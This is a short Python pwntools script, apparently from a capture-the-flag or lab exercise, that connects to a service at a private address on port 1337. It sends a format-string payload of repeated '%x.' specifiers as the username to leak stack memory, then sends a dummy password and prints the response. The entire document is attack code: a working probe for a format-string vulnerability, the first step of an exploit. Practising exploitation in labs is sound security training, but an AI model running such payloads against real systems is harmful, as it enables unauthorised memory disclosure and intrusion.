#!/usr/bin/env python

from pwn import *

context(log_level="DEBUG", bits=32, os="linux")

def connect():
    r=remote("192.168.13.101",1337)
    r.recvuntil("Username: ")
    return r

r=connect()
r.sendline("%x."*32)
r.recvuntil("Password: ")
r.sendline("AAAA")
data=r.recvline()

print data

